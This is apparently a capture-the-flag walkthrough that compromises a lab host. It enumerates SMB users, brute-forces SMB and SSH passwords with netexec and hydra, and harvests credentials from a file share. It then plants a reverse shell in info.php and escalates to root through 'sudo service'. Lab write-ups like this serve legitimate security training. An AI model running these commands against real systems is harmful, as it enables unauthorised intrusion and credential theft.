There are ports 22,80,139, and 445 open on the system.

Using enum4linux, we are able to get a number of usernames, the most interesing of which is satriani7

We use the netexec program to brute force this user's SMB password

nxc smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding

This user has access to the backup24 fileshare

smbclient //172.17.0.2/backup24 -U 'satriani7'

There are credentials in the \Documents\Personal directory

We can set up this file for password brute forcing:

cat credentials.txt | grep Usu | cut -d ' ' -f 3 | tr -d ' ' > users.txt

cat credentials.txt | grep Con | cut -d ':' -f 2 | tr -d ' ' > pass.txt

sed -i '1d' users.txt

paste -d ':' users.txt passwords.txt > creds.txt

hydra -C creds.txt 172.17.0.2 -T 16 ssh

We discover a credential pair so we login

Once in, we see that there's a file that our user has full access to, the info.php file

So we replace the contents of the info.php with a reverse shell payload

After that we're the www-data user, and it turns out they have sudo permissions with the service binary, which we can use to open a shell

service --status-all

sudo service ../../bin/sh -p

We're root

Finis
